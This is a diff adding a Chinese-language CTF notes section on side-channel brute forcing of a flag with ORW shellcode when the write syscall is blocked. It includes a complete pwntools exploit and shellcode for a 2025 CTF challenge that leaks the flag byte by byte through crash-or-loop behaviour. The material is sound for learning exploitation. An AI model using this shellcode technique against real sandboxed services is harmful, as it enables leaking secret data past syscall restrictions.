@@ -288,3 +288,78 @@ set -g @plugin 'tmux-plugins/tpm'
 set -g @plugin 'tmux-plugins/tmux-sensible'
 run '~/.tmux/plugins/tpm/tpm'
 ```
+
+## ORW shellcode，在缺少write下进行侧信道爆破
+
+缺少write可以使用sendfile等系统调用替代，但是在某些情境下（如只能使用特定的系统调用），只能进行侧信道爆破。其原理是：
+1. shellcode将flag读入到内存中
+2. shellcode每次对flag的一位进行比对，比对成功就进入无限循环，此时脚本可以与程序正常交互，不存在EOF；对比不成功就让程序crash，产生EOF
+3. 根据上面两种情况编写exp进行侧信道爆破
+
+以litctf 2025 shellcode为例：
+- 沙盒只允许open、read调用，也不允许转换成32位
+- 可写入100 bytes并执行
+
+这道题明显是考察侧信道爆破，最终exp如下：
+
+```python
+from pwn import *
+context(arch='amd64', os='linux')
+
+binary_path = './pwn'
+domain = "node10.anna.nssctf.cn"
+port = 29758
+
+def attack():
+    def exp(dis, char):
+        shellcode = '''
+            mov r10, rax
+            add r10, 0xf8
+            mov rax, 2
+            mov rdi, r10
+            xor rsi, rsi
+            xor rdx, rdx
+            syscall ;open()
+            
+            xor rax, rax
+            mov rdi, 3
+            sub r10, 0x88
+            mov rsi, r10
+            mov rdx, 0x20
+            syscall ;read()
+            
+            mov dl, byte ptr [rsi+{}]
+            mov cl, {}
+            cmp cl,dl
+            jz loop
+            mov al,60
+            syscall
+            loop:
+            jmp loop #关键的侧信道shellcode
+        '''.format(dis,char)
+        shellcode = asm(shellcode)
+        shellcode = shellcode.ljust(0x100-8, b'\x90')
+        shellcode += b'./flag\x00\x00'
+        io.recvuntil("Please input your shellcode: \n")
+        io.sendline(shellcode)
+    flag = ""
+    print("start!")
+    for i in range(60):
+        print("flag:"+flag)
+        for j in range(0x7e, 0x20, -1):
+            io = remote(domain, port)
+            try:
+                exp(i,j)
+                io.recvline(timeout=20) #根据网络情况测试timeout
+                flag += chr(j)
+                io.send('\n')
+                log.success("{} pos : {} success".format(i,chr(j)))
+                io.close()
+                break
+            except:           
+                io.close()
+                
+if __name__ == '__main__':
+    attack()
+```
+
